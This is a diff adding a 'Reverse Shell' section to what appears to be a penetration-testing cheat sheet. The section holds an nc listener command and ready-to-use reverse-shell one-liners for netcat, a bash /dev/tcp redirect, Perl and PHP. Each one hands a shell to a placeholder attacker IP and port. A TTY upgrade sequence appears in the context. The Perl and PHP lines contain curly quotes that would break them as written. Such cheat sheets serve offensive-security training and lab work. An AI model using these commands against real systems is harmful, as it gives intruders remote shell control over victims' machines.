@@ -399,18 +399,61 @@ wget http://{IP ADDRESS}/{FILE} -outfile {FILE}
 
 [https://gtfobins.github.io/](https://gtfobins.github.io/)
 
-## Linux
-
-## Windows
-
+<br />
 
 # Reverse Shell
 
+## NC Listen - Client [STEP 1]
+
+<br />
+
+```
+# About: A command used to listen to requests from a defined port
+# Download: Pre-installed on Kali Linux
+
+# Usage
+sudo nc –lnvp {PORT}
+
+# {PORT}: Select the port used to listen
+```
+
+<br />
+
+## NC Execute - Server [STEP 2]
+
+```
+# With Netcat installed
+
+# Usage - Windows
+nc.exe -e cmd.exe {IP ADDRESS} {PORT}
+
+# Usage - Linux 
+nc {IP ADDRESS} {PORT} –e /bin/bash
+
+# ===========================================
+
+# Without Netcat installed
+
+# Usage - transfer payload via file transfer and execute binary
+
+# Usage - Linux
+bash -i >& /dev/tcp/{IP ADDRESS}/{PORT} 0>&1
+
+# Usage - Perl
+perl -e ‘use Socket;$i=”{IP ADDRESS}″;$p={PORT};socket(S,PF_INET,SOCK_STREAM,getprotobyname(“tcp”));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,”>&S”);open(STDOUT,”>&S”);open(STDERR,”>&S”);exec(“/bin/sh -i”);};’
+
+# Usage - PHP
+php -r ‘$sock=fsockopen(“{IP ADDRESS}”,{PORT});exec(“/bin/sh -i <&3 >&3 2>&3”);’
+
+# {IP ADDRESS}: IP Address of the client from step one (listener)
+# {PORT}: Port of the client from step one (listener)
+```
+
+
 [https://www.revshells.com/](https://www.revshells.com/)
 
-## Linux
 
-## Windows
+
 
 # Shell Upgrade
 
@@ -433,6 +476,4 @@ python -c 'import pty;pty.spawn("/bin/bash")'
 CTRL&Z
 stty raw -echo; fg;
 export TERM=xterm
-
-
 ```
